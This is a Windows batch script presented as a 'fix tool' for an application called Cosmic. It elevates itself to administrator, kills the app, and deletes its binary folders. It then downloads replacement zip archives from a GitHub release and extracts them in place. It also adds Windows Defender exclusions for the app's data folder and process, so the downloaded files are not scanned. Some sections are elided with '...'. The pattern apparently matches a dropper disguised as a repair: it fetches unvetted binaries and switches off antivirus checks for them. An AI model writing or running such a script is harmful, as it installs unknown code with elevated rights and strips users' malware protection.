@echo off

:: =====================================
:: Request Administrator Privileges
:: =====================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

title Cosmic Fix Tool v2.0.0
color 5

echo =====================================
echo         Cosmic Fix Tool v2.0.0
echo =====================================
echo.
echo IMPORTANT:
echo Cosmic MUST be OPEN before running this fix.
echo.

set "CURRENT_VER=2.0.0"
set "SELF=%~f0"
set "RAW_VER=https://raw.githubusercontent.com/FixCosmicBat/FixCosmicBat/refs/heads/main/version.txt"
set "RAW_BAT=https://raw.githubusercontent.com/FixCosmicBat/FixCosmicBat/refs/heads/main/FixCosmic.bat"

goto check_update

:check_update
...
goto start

:start
...

set /p CONFIRM1=Is Cosmic currently open? (Y/N): 

if /I not "%CONFIRM1%"=="Y" (
    echo.
    echo Please open Cosmic and run the fix again.
    pause
    exit /b
)

echo.
set /p CONFIRM2=Do you want to start the repair process? (Y/N): 

if /I not "%CONFIRM2%"=="Y" (
    echo.
    echo Operation cancelled.
    pause
    exit /b
)

echo.
echo Detecting Cosmic installation...
echo.

:: =====================================
:: Get Cosmic path from running process
:: =====================================
for /f "delims=" %%i in ('powershell -Command "(Get-Process Cosmic-UI -ErrorAction SilentlyContinue).Path"') do set "COSMIC_EXE=%%i"

if not defined COSMIC_EXE (
    echo [ERROR] Could not detect Cosmic.
    echo Make sure Cosmic is running and try again.
    pause
    exit /b
)

for %%F in ("%COSMIC_EXE%") do set "COSMIC_DIR=%%~dpF"

set "BIN_DIR=%COSMIC_DIR%bin"
set "COSMIC_DATA=%LOCALAPPDATA%\com.savage.cosmic"

set "EBZIP=%TEMP%\EBWebView.zip"
set "EBTEMP=%TEMP%\EBWebViewFix"

set "BINZIP=%TEMP%\bin.zip"
set "BINTEMP=%TEMP%\BinFix"

echo Cosmic Path:
echo %COSMIC_EXE%
echo.

:: =====================================
:: Close Cosmic
:: =====================================
echo [1/7] Closing Cosmic...

taskkill /F /IM "Cosmic-UI.exe" >nul 2>&1
timeout /t 3 >nul

:: =====================================
:: Replace EBWebView
:: =====================================
echo.
echo [2/7] Removing old EBWebView...

if exist "%COSMIC_DATA%\EBWebView" (
    rmdir /s /q "%COSMIC_DATA%\EBWebView"
)

echo.
echo [3/7] Downloading latest EBWebView...

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/FixCosmicBat/FixCosmicBat/releases/download/Ebwiev/EBWebView.zip' -OutFile '%EBZIP%'"

if not exist "%EBZIP%" (
    echo.
    echo [ERROR] Failed to download EBWebView.
    pause
    exit /b
)

if exist "%EBTEMP%" rmdir /s /q "%EBTEMP%"

powershell -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%EBZIP%' -DestinationPath '%EBTEMP%' -Force"

if exist "%EBTEMP%\EBWebView" (
    xcopy "%EBTEMP%\EBWebView" "%COSMIC_DATA%\EBWebView\" /E /H /C /I /Y >nul
) else (
    xcopy "%EBTEMP%" "%COSMIC_DATA%\EBWebView\" /E /H /C /I /Y >nul
)

del "%EBZIP%" >nul 2>&1
rmdir /s /q "%EBTEMP%" >nul 2>&1

:: =====================================
:: Replace BIN Folder
:: =====================================
echo.
echo [4/7] Removing old bin folder...

if exist "%BIN_DIR%" (
    rmdir /s /q "%BIN_DIR%"
)

echo.
echo [5/7] Downloading latest bin folder...

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/FixCosmicBat/FixCosmicBat/releases/download/Bin/bin.zip' -OutFile '%BINZIP%'"

if not exist "%BINZIP%" (
    echo.
    echo [ERROR] Failed to download bin folder.
    pause
    exit /b
)

if exist "%BINTEMP%" rmdir /s /q "%BINTEMP%"

powershell -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%BINZIP%' -DestinationPath '%BINTEMP%' -Force"

if exist "%BINTEMP%\bin" (
    xcopy "%BINTEMP%\bin" "%BIN_DIR%\" /E /H /C /I /Y >nul
) else (
    xcopy "%BINTEMP%" "%BIN_DIR%\" /E /H /C /I /Y >nul
)

del "%BINZIP%" >nul 2>&1
rmdir /s /q "%BINTEMP%" >nul 2>&1

:: =====================================
:: Windows Defender Exclusions
:: =====================================
echo.
echo [6/7] Adding Windows Defender exclusions...

powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\com.savage.cosmic'" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'Cosmic-UI.exe'" >nul 2>&1

:: =====================================
:: Restart Cosmic
:: =====================================
echo.
echo [7/7] Restarting Cosmic...

if exist "%COSMIC_EXE%" (
    start "" "%COSMIC_EXE%"
)

echo.
echo =====================================
echo       FIX COMPLETED SUCCESSFULLY
echo =====================================
echo.
echo Cosmic has been repaired and restarted.
echo.
pause
